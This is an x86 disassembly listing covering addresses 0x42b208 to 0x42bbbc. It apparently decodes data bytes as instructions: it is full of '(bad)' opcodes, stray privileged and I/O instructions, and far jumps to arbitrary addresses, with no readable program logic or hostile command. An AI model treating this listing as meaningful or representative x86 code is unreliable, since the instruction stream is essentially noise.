  42b208:	mov    ds:0x1d251a5b,al
  42b20d:	shl    esi,1
  42b20f:	cmp    WORD PTR [esi+0x20d3d4e7],si
  42b216:	stos   BYTE PTR es:[edi],al
  42b217:	stc    
  42b218:	test   BYTE PTR [eax+0x25043c0],0xb6
  42b21f:	aas    
  42b220:	inc    edi
  42b221:	out    0x71,al
  42b223:	dec    ecx
  42b224:	into   
  42b225:	push   ss
  42b226:	lahf   
  42b227:	sti    
  42b228:	lock les ebx,FWORD PTR [ecx-0x3c013fdc]
  42b22f:	loop   0x42b25f
  42b231:	pop    ds
  42b232:	imul   edx,DWORD PTR [edi],0xc756556b
  42b238:	hlt    
  42b239:	adc    dh,BYTE PTR ds:0x134854fd
  42b23f:	aad    0x70
  42b241:	mov    ds:0x4ebd40b7,al
  42b246:	adc    esp,esi
  42b248:	xchg   DWORD PTR [edx],edi
  42b24a:	out    0x2,eax
  42b24c:	rol    DWORD PTR [ebx],cl
  42b24e:	daa    
  42b24f:	dec    esi
  42b250:	pop    esp
  42b251:	cdq    
  42b252:	add    ecx,DWORD PTR [ecx-0x70ab16e]
  42b258:	test   BYTE PTR [di-0x6e],dl
  42b25c:	stc    
  42b25d:	xchg   DWORD PTR [ebx-0x941a315],ebp
  42b263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b265:	add    al,0xd9
  42b267:	ret    0x30b3
  42b26a:	repz add eax,0x85084a37
  42b270:	icebp  
  42b271:	retf   0x52a5
  42b274:	dec    esp
  42b275:	les    ebx,FWORD PTR [ecx+0x51062894]
  42b27b:	dec    edx
  42b27c:	shr    ch,cl
  42b27e:	loope  0x42b2ba
  42b280:	data16 aaa 
  42b282:	outs   dx,DWORD PTR ds:[esi]
  42b283:	leave  
  42b284:	(bad)  [ebp+0x45]
  42b287:	int    0x58
  42b289:	fiadd  DWORD PTR [eax-0x60]
  42b28c:	jmp    0xdd01604a
  42b291:	ss mov esi,0xd7641e89
  42b297:	(bad)  
  42b298:	pop    esi
  42b299:	xchg   edx,eax
  42b29a:	and    DWORD PTR [edi+edi*2+0x70],edi
  42b29e:	jl     0x42b27d
  42b2a0:	sbb    DWORD PTR [ecx],edi
  42b2a2:	pop    ss
  42b2a3:	jbe    0x42b2ea
  42b2a5:	stos   DWORD PTR es:[edi],eax
  42b2a6:	and    eax,0x6f20f4a4
  42b2ab:	stc    
  42b2ac:	push   edx
  42b2ad:	dec    ecx
  42b2ae:	js     0x42b274
  42b2b0:	icebp  
  42b2b1:	outs   dx,BYTE PTR ds:[esi]
  42b2b2:	cmp    dl,BYTE PTR [ecx-0xe]
  42b2b5:	xchg   ecx,eax
  42b2b6:	mov    bh,0x16
  42b2b8:	aas    
  42b2b9:	(bad)
  42b2bd:	mov    eax,0x18157995
  42b2c2:	and    ebx,DWORD PTR [ebp-0x64]
  42b2c5:	arpl   WORD PTR [ebp+0x2e],dx
  42b2c8:	adc    eax,DWORD PTR [ebx]
  42b2ca:	outs   dx,DWORD PTR ds:[esi]
  42b2cb:	mov    ds:0xf7872fc7,al
  42b2d0:	mov    ebx,DWORD PTR [ebx]
  42b2d2:	add    esp,edi
  42b2d4:	pop    esp
  42b2d5:	repz or ch,BYTE PTR [eax-0x5a]
  42b2d9:	or     ebp,DWORD PTR [edi]
  42b2db:	xor    esi,DWORD PTR [eax+0x3b]
  42b2de:	xchg   BYTE PTR [bx],ah
  42b2e1:	ja     0x42b311
  42b2e3:	lahf   
  42b2e4:	mov    BYTE PTR [edi],ah
  42b2e6:	jmp    0xaf1ee226
  42b2eb:	shl    DWORD PTR [edi+0x59],1
	...
  42b355:	add    BYTE PTR [ebp-0x449f6672],ah
  42b35b:	ja     0x42b35a
  42b35d:	iret   
  42b35e:	sub    eax,0x78738e65
  42b363:	jmp    0x42b3b3
  42b365:	out    0x67,eax
  42b367:	iret   
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	dec    esp
  42b36f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b370:	jmp    0x42b2fa
  42b372:	sub    al,0x2
  42b374:	cdq    
  42b375:	mov    ds:0xcaedbcb,al
  42b37a:	in     al,0x2d
  42b37c:	mov    eax,ds:0x37d5341a
  42b381:	aaa    
  42b382:	js     0x42b39d
  42b384:	out    0xb0,al
  42b386:	lock stos BYTE PTR es:[edi],al
  42b388:	das    
  42b389:	and    ebp,0xbee76f6f
  42b38f:	push   ebx
  42b390:	repnz (bad) [edx]
  42b393:	call   0x9379eeec
  42b398:	xlat   BYTE PTR ds:[ebx]
  42b399:	addr16 jg 0x42b3f8
  42b39c:	adc    BYTE PTR [ebx+0x30679da3],bl
  42b3a2:	and    al,0x77
  42b3a4:	push   ds
  42b3a5:	adc    dh,BYTE PTR [edx-0x58d37600]
  42b3ab:	push   esi
  42b3ac:	ds inc ecx
  42b3ae:	or     cl,BYTE PTR [ecx-0x4e]
  42b3b1:	mov    al,0xea
  42b3b3:	cmp    edx,edx
  42b3b5:	jmp    0x8990f875
  42b3ba:	cmp    ebp,DWORD PTR [eax]
  42b3bc:	cmc    
  42b3bd:	es mov edx,0x4d88a127
  42b3c3:	add    al,BYTE PTR [esi-0x2]
  42b3c6:	inc    ebx
  42b3c7:	xor    edx,DWORD PTR [ecx]
  42b3c9:	aaa    
  42b3ca:	div    DWORD PTR [eax-0x6e52af80]
  42b3d0:	imul   esi,DWORD PTR [ebx-0x3d21f387],0x39
  42b3d7:	rol    BYTE PTR [ebx+0x59ca8e34],1
  42b3dd:	add    DWORD PTR [edi],0xffffffca
  42b3e0:	xor    eax,0xc8e371c3
  42b3e5:	add    eax,0x13494e3a
  42b3ea:	hlt    
  42b3eb:	sbb    al,0xbb
  42b3ed:	ret    
  42b3ee:	stos   BYTE PTR es:[edi],al
  42b3ef:	fcom   QWORD PTR ds:0x76687278
  42b3f5:	inc    ecx
  42b3f6:	ret    
  42b3f7:	stos   DWORD PTR es:[edi],eax
  42b3f8:	jp     0x42b384
  42b3fa:	cs test al,bl
  42b3fd:	add    ebx,eax
  42b3ff:	in     al,0x5d
  42b401:	or     DWORD PTR [esi],edi
  42b403:	ret    0x1f91
  42b406:	ja     0x42b392
  42b408:	mov    esi,0x92466953
  42b40d:	mov    WORD PTR [edx-0x13],gs
  42b410:	(bad)  
  42b412:	dec    ecx
  42b413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b414:	ror    BYTE PTR ds:0x4952ffd3,0x5b
  42b41b:	dec    esi
  42b41c:	adc    ch,BYTE PTR [ebp-0x1b4416b6]
  42b422:	sbb    ebx,DWORD PTR [edi+0x3843a9d6]
  42b428:	mov    ah,0x31
  42b42a:	clc    
  42b42b:	xchg   ebx,eax
  42b42c:	loope  0x42b479
  42b42e:	lock cdq 
  42b430:	inc    esi
  42b431:	es push esi
  42b433:	and    DWORD PTR [edx-0x22],ebp
  42b436:	adc    dl,BYTE PTR [esi+edx*2]
  42b439:	adc    DWORD PTR [edi+0x50],0x6a
  42b43d:	push   cs
  42b43e:	adc    DWORD PTR ds:0xe863274c,esp
  42b444:	int3   
  42b445:	jl     0x42b42c
  42b447:	dec    eax
  42b448:	xchg   esi,eax
  42b449:	les    edx,FWORD PTR [ebp-0x32]
  42b44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b44d:	or     ah,BYTE PTR [esi-0x5e71d28a]
  42b453:	cmc    
  42b454:	sub    al,0x83
  42b456:	into   
  42b457:	call   0x83f7453b
  42b45c:	shr    BYTE PTR [edx+ebp*1],0x9
  42b460:	sub    bh,0xb0
  42b463:	out    0x2c,al
  42b465:	mov    esi,0x18cf9b82
  42b46a:	aam    0x74
  42b46c:	jb     0x42b4af
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   ebp,ecx
  42b4e3:	mov    ah,0xb5
  42b4e5:	xor    eax,0x1d067
  42b4ea:	add    BYTE PTR [ecx],al
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	dec    edi
  42b4ef:	sub    bl,BYTE PTR [ebp-0x7b678a2a]
  42b4f5:	inc    eax
  42b4f6:	ja     0x42b517
  42b4f8:	and    al,0x50
  42b4fa:	fdivr  st(3),st
  42b4fc:	test   eax,0x4fccca0f
  42b501:	inc    esi
  42b502:	pop    ebx
  42b503:	push   0x72
  42b505:	ret    
  42b506:	or     esp,DWORD PTR [edx-0x78c32b2]
  42b50c:	sub    dl,BYTE PTR [edi]
  42b50e:	or     BYTE PTR [ebx-0x403a9291],cl
  42b514:	inc    esp
  42b515:	inc    ebp
  42b516:	sti    
  42b517:	aam    0x4c
  42b519:	test   al,0x1f
  42b51b:	inc    ebx
  42b51c:	clc    
  42b51d:	mov    bh,0x11
  42b51f:	pop    ds
  42b520:	push   ebx
  42b521:	mov    eax,0x9d0fda97
  42b526:	xchg   BYTE PTR [ebx+0x6a3c74d9],al
  42b52c:	cmp    bl,BYTE PTR [edx+eiz*1-0x74]
  42b530:	or     DWORD PTR [ebx-0x4517148a],edx
  42b536:	and    al,0xdb
  42b538:	iret   
  42b539:	ja     0x42b579
  42b53b:	sub    al,0x8a
  42b53d:	ret    0xb0f6
  42b540:	add    eax,DWORD PTR [ebp+ecx*1+0x46be7326]
  42b547:	icebp  
  42b548:	stos   BYTE PTR es:[edi],al
  42b549:	ins    BYTE PTR es:[edi],dx
  42b54a:	xor    DWORD PTR [ebx],edi
  42b54c:	mov    eax,0xf39e1bf9
  42b551:	pop    edx
  42b552:	adc    BYTE PTR [ecx],ah
  42b554:	punpckhdq mm6,mm1
  42b557:	test   al,0x0
  42b559:	fsub   st(6),st
  42b55b:	repnz jmp 0x9517:0x1dbea015
  42b563:	iret   
  42b564:	pop    ds
  42b565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b567:	pusha  
  42b568:	add    al,0xc4
  42b56a:	(bad)  
  42b56b:	(bad)  
  42b56c:	icebp  
  42b56d:	push   esi
  42b56e:	adc    BYTE PTR [edi],0x6c
  42b571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b572:	sub    al,0xca
  42b574:	std    
  42b575:	jo     0x42b56d
  42b577:	pop    eax
  42b578:	pop    esp
  42b579:	sub    DWORD PTR [edx],eax
  42b57b:	xchg   edx,eax
  42b57c:	push   es
  42b57d:	pop    eax
  42b57e:	shr    DWORD PTR [eax],cl
  42b580:	imul   esp,DWORD PTR ds:0x150113dd,0xdf6ba9c1
  42b58a:	mov    esp,0x2ac40044
  42b58f:	ret    
  42b590:	out    dx,al
  42b591:	int    0x51
  42b593:	inc    eax
  42b594:	cmc    
  42b595:	jno    0x42b5de
  42b597:	inc    esp
  42b598:	in     eax,dx
  42b599:	pop    ds
  42b59a:	sbb    ebx,DWORD PTR [edx+0xd94a4fa]
  42b5a0:	cmp    esi,eax
  42b5a2:	cld    
  42b5a3:	xor    DWORD PTR [eax+0x1c],edi
  42b5a6:	dec    edx
  42b5a7:	jb     0x42b5d9
  42b5a9:	(bad)  
  42b5aa:	jmp    0x1288:0xb80a69e7
  42b5b1:	js     0x42b573
  42b5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5b4:	(bad)  
  42b5b5:	mov    al,ds:0x442acb3f
  42b5ba:	and    al,0xf3
  42b5bc:	mov    bh,0xbe
  42b5be:	mov    eax,0x366353fd
  42b5c3:	clc    
  42b5c4:	jnp    0x42b5dc
  42b5c6:	cs pop esi
  42b5c8:	outs   dx,DWORD PTR ds:[esi]
  42b5c9:	cmp    eax,0xfd19e72d
  42b5ce:	mov    edi,0x3072d2c7
  42b5d3:	aas    
  42b5d4:	ret    0xdc2
  42b5d7:	inc    ebx
  42b5d8:	or     BYTE PTR [ebx],0x38
  42b5db:	idiv   al
  42b5dd:	mov    DWORD PTR [eax+0xe],eax
  42b5e0:	fisttp WORD PTR [esi+eiz*2]
  42b5e3:	lods   al,BYTE PTR ds:[esi]
  42b5e4:	repz push 0x91e510af
  42b5ea:	dec    eax
  42b5eb:	xchg   ebp,eax
  42b5ec:	(bad)  
  42b5ed:	call   0x0:0x0
	...
  42b654:	add    BYTE PTR [eax],al
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	fadd   QWORD PTR [ecx]
  42b664:	or     BYTE PTR [edi],bh
  42b666:	rol    DWORD PTR [bx+di],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [esi+edi*2+0x43fb72cd],bh
  42b674:	jae    0x42b6c2
  42b676:	addr16 jo 0x42b6f8
  42b679:	int    0x99
  42b67b:	sub    dh,BYTE PTR [eax-0x4f]
  42b67e:	pop    es
  42b67f:	ror    DWORD PTR [eax+edi*8],0xd9
  42b683:	inc    esp
  42b684:	push   ss
  42b685:	sub    BYTE PTR [ebx],dh
  42b687:	add    al,0x46
  42b689:	addr16 pop edx
  42b68b:	gs cwde 
  42b68d:	cmp    eax,0x7910b828
  42b692:	ror    BYTE PTR [ebx],1
  42b694:	mov    ecx,DWORD PTR [ebx]
  42b696:	xchg   edx,eax
  42b697:	xor    esi,edx
  42b699:	or     bh,BYTE PTR [ebp+0x3e]
  42b69c:	sub    eax,0x4ab697c9
  42b6a1:	in     eax,0x33
  42b6a3:	sbb    BYTE PTR [edx-0x72],cl
  42b6a6:	dec    ebp
  42b6a7:	xlat   BYTE PTR ds:[ebx]
  42b6a8:	cli    
  42b6a9:	dec    ecx
  42b6aa:	(bad)
  42b6ae:	cs dec ecx
  42b6b0:	movhps xmm5,QWORD PTR [edx]
  42b6b3:	pusha  
  42b6b4:	dec    esp
  42b6b5:	je     0x42b68f
  42b6b7:	inc    ebx
  42b6b8:	sar    DWORD PTR ds:0x395c7661,cl
  42b6be:	sub    al,0x5e
  42b6c0:	or     al,0xe7
  42b6c2:	dec    eax
  42b6c3:	mov    bl,0x9e
  42b6c5:	adc    DWORD PTR [edi+edi*1],ebx
  42b6c8:	jmp    0x42b652
  42b6ca:	and    eax,0xced2e41c
  42b6cf:	sbb    BYTE PTR [esi+0x383d7e61],bl
  42b6d5:	mov    dh,0xfa
  42b6d7:	xor    dl,BYTE PTR [edi]
  42b6d9:	test   DWORD PTR [ebp-0x65],esi
  42b6dc:	aas    
  42b6dd:	jmp    0x7ff4f554
  42b6e2:	cs push edx
  42b6e4:	(bad)  
  42b6e5:	in     eax,0x16
  42b6e7:	pop    ebp
  42b6e8:	pop    ss
  42b6e9:	push   eax
  42b6ea:	popf   
  42b6eb:	leave  
  42b6ec:	sbb    ebp,DWORD PTR [esi]
  42b6ee:	pop    edx
  42b6ef:	aam    0x1c
  42b6f1:	inc    edx
  42b6f2:	mov    ds:0xdeca76df,eax
  42b6f7:	sahf   
  42b6f8:	ja     0x42b746
  42b6fa:	lahf   
  42b6fb:	rcr    BYTE PTR [eax-0x7a],1
  42b6fe:	shl    BYTE PTR [ecx-0x78c75173],0x6a
  42b705:	ss sub eax,0xd4149747
  42b70b:	mov    ebx,0x3e0fe899
  42b710:	sti    
  42b711:	cmp    DWORD PTR [eax],esp
  42b713:	mov    bh,0x6f
  42b715:	(bad)  
  42b716:	into   
  42b717:	popa   
  42b718:	mov    ch,0x57
  42b71a:	mov    cl,BYTE PTR [edi-0x2c]
  42b71d:	cmp    edi,DWORD PTR [ebx+ebx*1]
  42b720:	std    
  42b721:	fisttp QWORD PTR [edx-0x9]
  42b724:	adc    DWORD PTR [ebp+0x44],esi
  42b727:	in     al,dx
  42b728:	imul   ebx,DWORD PTR [esi-0x5ef9b7be],0xffffffb0
  42b72f:	push   edi
  42b730:	idiv   DWORD PTR [eax-0x1e]
  42b733:	call   0xfc755d83
  42b738:	int    0x50
  42b73a:	add    BYTE PTR [ebp+0x78],bl
  42b73d:	mov    ?,WORD PTR [edx]
  42b73f:	adc    bh,al
  42b741:	call   0x7ce1:0x2355a4f3
  42b748:	dec    eax
  42b749:	lock sahf 
  42b74b:	xchg   ebx,eax
  42b74c:	lahf   
  42b74d:	aaa    
  42b74e:	jno    0x42b7a7
  42b750:	sub    al,0x35
  42b752:	(bad)
  42b755:	les    ebp,FWORD PTR fs:[edx-0x448083cb]
  42b75c:	inc    esi
  42b75d:	sub    edx,DWORD PTR [ebp-0x54498a67]
  42b763:	cmp    eax,0x232a1d65
  42b768:	notrack call DWORD PTR [edx+0x5b]
  42b76c:	gs ins BYTE PTR es:[edi],dx
	...
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	out    dx,al
  42b7e3:	sbb    al,0xd0
  42b7e5:	push   edi
  42b7e6:	rol    BYTE PTR [bx+di],cl
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    dh,dh
  42b7ef:	(bad)  
  42b7f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7f1:	and    DWORD PTR [ebp+0x3],ebp
  42b7f4:	push   ss
  42b7f5:	xor    eax,esp
  42b7f7:	sub    BYTE PTR [edx+0x28],al
  42b7fa:	ins    DWORD PTR es:[edi],dx
  42b7fb:	add    eax,0x72e3532
  42b800:	test   esi,eax
  42b802:	icebp  
  42b803:	sub    eax,DWORD PTR [edi]
  42b805:	adc    al,0x3d
  42b807:	(bad)  
  42b808:	jo     0x42b7a0
  42b80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b80b:	mov    esp,0x28f050cc
  42b810:	or     bh,dl
  42b812:	hlt    
  42b813:	and    eax,0x3eaf140f
  42b818:	rol    BYTE PTR [ecx],cl
  42b81a:	loopne 0x42b89a
  42b81c:	add    eax,0x88c96714
  42b821:	inc    ecx
  42b822:	jbe    0x42b88c
  42b824:	jmp    0x9df7:0x68ae213d
  42b82b:	sub    DWORD PTR [ecx],0x67
  42b82e:	jne    0x42b829
  42b830:	mov    cl,0x7
  42b832:	fidiv  DWORD PTR [ebp+0x3af741a]
  42b838:	xchg   ebx,eax
  42b839:	cmp    BYTE PTR [esi-0x2885f486],0x5f
  42b840:	loopne 0x42b846
  42b842:	cmc    
  42b843:	in     al,dx
  42b844:	mov    esi,0x3f27ccc7
  42b849:	jp     0x42b84d
  42b84b:	mov    al,ds:0x41fd4d98
  42b850:	je     0x42b872
  42b852:	es jnp 0x42b7db
  42b855:	(bad)  
  42b856:	mov    ah,0x8c
  42b858:	popf   
  42b859:	xchg   edx,eax
  42b85a:	pusha  
  42b85b:	dec    edx
  42b85c:	mov    dh,0x79
  42b85e:	imul   esp,DWORD PTR [eax+edx*8+0x3f],0x40
  42b863:	jge    0x42b8a5
  42b865:	gs hlt 
  42b867:	pop    esp
  42b868:	pop    eax
  42b869:	pop    esi
  42b86a:	mov    cl,0xcd
  42b86c:	ins    BYTE PTR es:[edi],dx
  42b86d:	loop   0x42b8b7
  42b86f:	retf   0x61a8
  42b872:	xlat   BYTE PTR ds:[ebx]
  42b873:	loop   0x42b8d7
  42b875:	(bad)  
  42b876:	retf   0x847f
  42b879:	leave  
  42b87a:	add    BYTE PTR [edx+0x67d7eae0],ah
  42b880:	aas    
  42b881:	sahf   
  42b882:	mov    dh,0xd
  42b884:	push   0x4b1b707d
  42b889:	jnp    0x42b8a8
  42b88b:	shl    DWORD PTR [esi+esi*8+0x76],0x34
  42b890:	int3   
  42b891:	lea    esp,[edi+0x61]
  42b894:	xor    BYTE PTR [esi],al
  42b896:	paddb  mm1,QWORD PTR [esi]
  42b899:	mov    ebp,eax
  42b89b:	inc    esi
  42b89c:	jge    0x42b8b9
  42b89e:	jp     0x42b86b
  42b8a0:	xchg   ebx,eax
  42b8a1:	out    dx,eax
  42b8a2:	into   
  42b8a3:	cld    
  42b8a4:	repnz (bad) [ebx-0x2c]
  42b8a8:	mov    cs,eax
  42b8aa:	call   0x6927:0xa21384ee
  42b8b1:	adc    al,0x99
  42b8b3:	mov    esp,0x946765cf
  42b8b8:	std    
  42b8b9:	cwde   
  42b8ba:	ins    BYTE PTR es:[edi],dx
  42b8bb:	jae    0x42b8f8
  42b8bd:	and    eax,0xc6a68d2d
  42b8c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b8c3:	stc    
  42b8c4:	xchg   edi,eax
  42b8c5:	jmp    DWORD PTR [ecx-0x33a4bdca]
  42b8cb:	dec    edx
  42b8cc:	mov    dl,0x2f
  42b8ce:	leave  
  42b8cf:	(bad)  
  42b8d0:	inc    esp
  42b8d1:	xor    cl,BYTE PTR [ebx+0x55]
  42b8d4:	imul   esi,DWORD PTR [ebx+edi*2],0x9776d649
  42b8db:	imul   ebx,ecx,0x4cc149f5
  42b8e1:	inc    edx
  42b8e2:	and    eax,0x89900ed4
  42b8e7:	sub    al,BYTE PTR [ebx+0x2449b94e]
  42b8ed:	jo     0x42b8ef
	...
  42b953:	add    BYTE PTR [eax],al
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     eax,esp
  42b963:	aam    0x14
  42b965:	mov    eax,ds:0x1d367
  42b96a:	add    BYTE PTR [ecx],al
  42b96c:	add    BYTE PTR [eax],al
  42b96e:	or     ecx,DWORD PTR ds:0x26cb7dc2
  42b974:	jo     0x42b90a
  42b976:	cli    
  42b977:	or     al,0x7c
  42b979:	push   esp
  42b97a:	call   0x3caf46a9
  42b97f:	(bad)  
  42b980:	mov    eax,eax
  42b982:	iret   
  42b983:	cmp    DWORD PTR [ecx+eiz*1],esi
  42b986:	loopne 0x42b961
  42b988:	addr16 jo 0x42b9d6
  42b98b:	dec    ecx
  42b98c:	clc    
  42b98d:	jmp    0xc281:0xc4948a25
  42b994:	jmp    0x107cafb3
  42b999:	(bad)  
  42b99a:	div    BYTE PTR [edx-0xd386041]
  42b9a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9a1:	mov    dh,al
  42b9a3:	cli    
  42b9a4:	jle    0x42b96a
  42b9a6:	ss stos DWORD PTR es:[edi],eax
  42b9a8:	je     0x42b98b
  42b9aa:	push   esp
  42b9ab:	xor    al,0x4c
  42b9ad:	pop    esp
  42b9ae:	add    al,0xf5
  42b9b0:	daa    
  42b9b1:	sbb    ah,BYTE PTR [esi-0x62b9cf40]
  42b9b7:	pop    ds
  42b9b8:	rcr    DWORD PTR [edx+0x32ed5390],1
  42b9be:	inc    ecx
  42b9bf:	jp     0x42b986
  42b9c1:	push   edi
  42b9c2:	shl    edx,1
  42b9c4:	mov    ah,0xca
  42b9c6:	ins    BYTE PTR es:[edi],dx
  42b9c7:	mov    dh,BYTE PTR [ebx+edi*8-0x63]
  42b9cb:	sub    eax,DWORD PTR [edx-0x44]
  42b9ce:	aaa    
  42b9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9d0:	inc    edi
  42b9d1:	sub    bl,BYTE PTR [edx*2-0x4ed01820]
  42b9d8:	push   es
  42b9d9:	es repz push ebp
  42b9dc:	add    BYTE PTR ds:0x9ba37232,ah
  42b9e2:	xor    al,0x2d
  42b9e4:	lds    edx,FWORD PTR [edi-0x24]
  42b9e7:	adc    esi,DWORD PTR [ebp+0x21]
  42b9ea:	push   esp
  42b9eb:	mov    dl,BYTE PTR [ebx+0xa]
  42b9ee:	(bad)  
  42b9f0:	out    0x14,al
  42b9f2:	ss dec ebx
  42b9f4:	inc    eax
  42b9f5:	inc    ebx
  42b9f6:	sub    eax,0x43e27737
  42b9fb:	mov    ebx,0x3c5e6c2c
  42ba00:	iret   
  42ba01:	mov    eax,0xeb0ba690
  42ba06:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba08:	stos   DWORD PTR es:[edi],eax
  42ba09:	popf   
  42ba0a:	ret    0xa449
  42ba0d:	sbb    edx,DWORD PTR [ebx]
  42ba0f:	aam    0x70
  42ba11:	push   ss
  42ba12:	pop    ss
  42ba13:	scas   al,BYTE PTR es:[edi]
  42ba14:	add    BYTE PTR [ecx-0x5f93f92f],cl
  42ba1a:	or     ebp,DWORD PTR gs:[eax-0x50]
  42ba1e:	iret   
  42ba1f:	ins    DWORD PTR es:[edi],dx
  42ba20:	sbb    cl,0xae
  42ba23:	prefetcht0 BYTE PTR [ebp-0x36e71f43]
  42ba2a:	lahf   
  42ba2b:	test   al,0xb6
  42ba2d:	inc    esi
  42ba2e:	push   cs
  42ba2f:	ror    bl,1
  42ba31:	adc    eax,0xfbe0c3c8
  42ba36:	int    0xf4
  42ba38:	jne    0x42b9d2
  42ba3a:	out    0x5e,al
  42ba3c:	or     DWORD PTR [eax+eiz*2-0x4b],0xb97a893c
  42ba44:	pop    ebp
  42ba45:	push   0x8
  42ba47:	mov    bh,0xc9
  42ba49:	pusha  
  42ba4a:	ja     0x42ba51
  42ba4c:	rcl    BYTE PTR [eax-0x78],1
  42ba4f:	push   edx
  42ba50:	hlt    
  42ba51:	neg    BYTE PTR [edi-0x2b89a085]
  42ba57:	sti    
  42ba58:	xchg   edi,eax
  42ba59:	sub    DWORD PTR [edx],0x9
  42ba5c:	push   ds
  42ba5d:	ja     0x42b9f1
  42ba5f:	aaa    
  42ba60:	inc    ebp
  42ba61:	and    al,0xa2
  42ba63:	dec    ecx
  42ba64:	out    dx,eax
  42ba65:	cmp    BYTE PTR [eax+edi*1-0x6590d4b1],ch
  42ba6c:	inc    eax
  42ba6d:	imul   eax,DWORD PTR [eax],0x0
	...
  42bad3:	add    BYTE PTR [eax],al
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [ebp+0x4f],edx
  42bae4:	jecxz  0x42bb38
  42bae6:	addr16 aam 0x1
  42bae9:	add    BYTE PTR [eax],al
  42baeb:	add    DWORD PTR [eax],eax
  42baed:	add    cl,ch
  42baef:	jmp    DWORD PTR es:[si+0x3]
  42baf4:	shl    DWORD PTR [ebx+0x746a6935],cl
  42bafa:	push   0x6c6d0f4f
  42baff:	mov    eax,ds:0xed0b5cbd
  42bb04:	imul   ecx,DWORD PTR [esi+0x26],0xda344f90
  42bb0b:	rcr    DWORD PTR [eax+0x45707ab6],cl
  42bb11:	fwait
  42bb12:	test   al,0x81
  42bb14:	mov    ebp,0x56cf3049
  42bb19:	dec    ebx
  42bb1a:	mov    ecx,0xded33a3c
  42bb1f:	cdq    
  42bb20:	pop    esp
  42bb21:	test   al,0xb9
  42bb23:	lds    eax,FWORD PTR [eax+0x57]
  42bb26:	ins    DWORD PTR es:[edi],dx
  42bb27:	cmp    edi,DWORD PTR [ebx+0x4b]
  42bb2a:	or     BYTE PTR [edx],0xf4
  42bb2d:	mov    esp,0x74fec9b9
  42bb32:	das    
  42bb33:	nop
  42bb34:	add    BYTE PTR [eax],cl
  42bb36:	in     eax,dx
  42bb37:	iret   
  42bb38:	mov    esp,0x3ac026a4
  42bb3d:	cmp    eax,0x9bb4a675
  42bb42:	add    al,0x7a
  42bb44:	ror    ecx,0x19
  42bb47:	ret    
  42bb48:	lods   eax,DWORD PTR ds:[esi]
  42bb49:	xchg   DWORD PTR [ebx+0x13],ecx
  42bb4c:	rol    DWORD PTR [edx+ebx*1+0x20],cl
  42bb50:	xchg   esi,eax
  42bb51:	cmp    al,0xbb
  42bb53:	push   esi
  42bb54:	jae    0x42bb01
  42bb56:	js     0x42bb4a
  42bb58:	xchg   dl,al
  42bb5a:	or     eax,0x16de77fe
  42bb5f:	cmc    
  42bb60:	imul   esp,DWORD PTR [edi-0x2],0x1cce9e07
  42bb67:	fs mov edi,0x5a95988a
  42bb6d:	xor    ecx,0xe286249c
  42bb73:	add    eax,0x5ab1b0cc
  42bb78:	fst    DWORD PTR [esi]
  42bb7a:	hlt    
  42bb7b:	mov    ch,BYTE PTR [edi]
  42bb7d:	lea    ebp,[esi+0x14]
  42bb80:	xchg   DWORD PTR [edi],edi
  42bb82:	jge    0x42bbe1
  42bb84:	jg     0x42bb57
  42bb86:	jg     0x42bbef
  42bb88:	shl    BYTE PTR [esp+ebp*1],1
  42bb8b:	mov    ch,0x58
  42bb8d:	xchg   ebx,eax
  42bb8e:	iret   
  42bb8f:	icebp  
  42bb90:	pcmpeqb mm4,mm4
  42bb93:	aad    0xbb
  42bb95:	and    edx,eax
  42bb97:	pop    edi
  42bb98:	adc    ebx,edx
  42bb9a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb9c:	in     eax,dx
  42bb9d:	fstp   TBYTE PTR [edi-0x2b6d11e2]
  42bba3:	jecxz  0x42bb56
  42bba5:	xchg   DWORD PTR [eax-0x575b84ab],ecx
  42bbab:	das    
  42bbac:	mov    cl,0xc7
  42bbae:	push   cs
  42bbaf:	xchg   DWORD PTR [edi+edx*2],esi
  42bbb2:	setbe  BYTE PTR [edi]
  42bbb5:	adc    esp,DWORD PTR [eax]
  42bbb7:	pop    esi
  42bbb8:	mov    BYTE PTR [ebx+eax*4-0xe],dh
  42bbbc:	(bad)  
